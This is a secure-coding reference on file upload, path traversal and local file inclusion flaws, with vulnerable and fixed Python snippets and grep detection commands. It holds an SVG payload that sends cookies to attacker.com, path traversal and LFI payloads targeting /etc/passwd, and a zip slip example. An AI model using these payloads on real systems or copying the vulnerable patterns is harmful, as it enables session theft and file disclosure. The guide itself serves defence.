# File Security — Reference (Upload, Path Traversal, LFI)

## File Upload Security

### Validation Hierarchy (ALL three required)
```
1. Extension whitelist  — weakest (easily changed by attacker)
2. MIME type check      — medium (can be spoofed in Content-Type header)
3. Magic bytes check    — strongest (actual file content)
```

### Magic Bytes for Common Types
```python
MAGIC_BYTES = {
    "image/jpeg": b"\xff\xd8\xff",
    "image/png":  b"\x89PNG\r\n\x1a\n",
    "image/gif":  b"GIF8",
    "image/webp": b"RIFF",
    "application/pdf": b"%PDF",
    "application/zip": b"PK\x03\x04",  # also docx, xlsx, pptx
}

def validate_file(file_bytes: bytes, allowed_types: list[str]) -> bool:
    for mime_type in allowed_types:
        magic = MAGIC_BYTES.get(mime_type)
        if magic and file_bytes.startswith(magic):
            return True
    return False
```

### Vulnerable Upload Patterns
```python
# VULNERABLE #1 — trusts extension only
@router.post("/upload")
async def upload(file: UploadFile):
    if file.filename.endswith((".jpg", ".png")):
        save(file)  # attacker uploads shell.php named shell.jpg

# VULNERABLE #2 — trusts Content-Type header
if file.content_type in ["image/jpeg", "image/png"]:
    save(file)  # attacker sets Content-Type: image/jpeg on a PHP shell

# SAFE — check magic bytes
content = await file.read()
if not validate_file(content, ["image/jpeg", "image/png"]):
    raise HTTPException(400, "Invalid file type")
```

### SVG → XSS Attack
```xml
<!-- Attacker uploads valid SVG (magic bytes: <svg) that contains XSS -->
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/?c='+document.cookie)">
  <rect width="100" height="100"/>
</svg>
```

**Fix:** If accepting SVG — sanitize with svg-sanitizer. Better: convert to raster PNG server-side.

### Zip Slip Attack
```python
# VULNERABLE — zip extraction with path traversal
import zipfile
with zipfile.ZipFile(uploaded_zip) as zf:
    zf.extractall("/app/uploads/")
# If zip contains: ../../etc/cron.d/backdoor → writes outside /app/uploads/

# SAFE
import zipfile
from pathlib import Path

UPLOAD_DIR = Path("/app/uploads").resolve()

with zipfile.ZipFile(uploaded_zip) as zf:
    for member in zf.namelist():
        target = (UPLOAD_DIR / member).resolve()
        if not str(target).startswith(str(UPLOAD_DIR)):
            raise ValueError(f"Zip slip detected: {member}")
    zf.extractall(UPLOAD_DIR)
```

### File Storage — Never Serve from Webroot
```
WRONG: /app/static/uploads/user_files/  ← directly served as static files
       Anyone can access uploaded files including scripts

RIGHT: /app/data/uploads/               ← outside webroot
       Serve via authenticated endpoint that checks ownership:
       GET /api/files/{file_id} → checks auth → streams file
```

### Detection
```bash
# Find file upload handlers
grep -rn "UploadFile\|multipart\|FormData\|\.save(\|move_uploaded" \
  --include="*.py" --include="*.ts" --include="*.php" . | grep -v test | grep -v node_modules

# Check if magic bytes validation is present
grep -rn "magic\|file\.read\|content_type\|mime\|sniffio" \
  --include="*.py" . | grep -v test

# Find where files are stored
grep -rn "open(\|write(\|shutil\.\|static\|uploads" \
  --include="*.py" . | grep -v test | grep -v import
```

---

## Path Traversal

### Attack Payloads
```
../../etc/passwd
..%2F..%2Fetc%2Fpasswd       (URL encoded)
..%252F..%252Fetc%252Fpasswd  (double encoded)
....//....//etc/passwd        (filter bypass)
/etc/passwd%00.jpg            (null byte injection — older PHP)
```

### Vulnerable Patterns
```python
# VULNERABLE
@router.get("/files/{filename}")
async def get_file(filename: str):
    return FileResponse(f"/app/uploads/{filename}")
# Attack: /files/../../etc/passwd

# VULNERABLE #2 — basename is NOT enough
import os
safe_name = os.path.basename(filename)  # strips ../ but attacker can use /etc/passwd directly
return FileResponse(f"/app/uploads/{safe_name}")
# Attack: /files/%2Fetc%2Fpasswd → basename = "passwd" in some implementations

# SAFE — resolve and check containment
from pathlib import Path

BASE_DIR = Path("/app/uploads").resolve()

@router.get("/files/{filename}")
async def get_file(filename: str):
    requested = (BASE_DIR / filename).resolve()
    if not str(requested).startswith(str(BASE_DIR)):
        raise HTTPException(400, "Invalid path")
    if not requested.exists():
        raise HTTPException(404)
    return FileResponse(requested)
```

### Detection
```bash
grep -rn "FileResponse\|send_file\|open(\|Path(\|os\.path\.join" \
  --include="*.py" . | grep -v test | grep -v settings | grep -v config
# → Check if user-controlled input feeds into file path
```

---

## Local File Inclusion (LFI)

### PHP-Style LFI (also relevant for template engines)
```python
# VULNERABLE — dynamic template loading
@app.route("/page")
def page():
    page_name = request.args.get("page")
    return render_template(f"pages/{page_name}.html")
# Attack: ?page=../../../../etc/passwd%00
# Attack: ?page=../admin/secret

# SAFE — whitelist
ALLOWED_PAGES = {"home", "about", "contact", "faq"}

@app.route("/page")
def page():
    page_name = request.args.get("page", "home")
    if page_name not in ALLOWED_PAGES:
        abort(404)
    return render_template(f"pages/{page_name}.html")
```

---

## CWE References
- CWE-22: Path Traversal
- CWE-73: External Control of File Name or Path
- CWE-434: Unrestricted Upload of File with Dangerous Type
- CWE-98: PHP File Inclusion (LFI)
- CWE-23: Relative Path Traversal (zip slip)
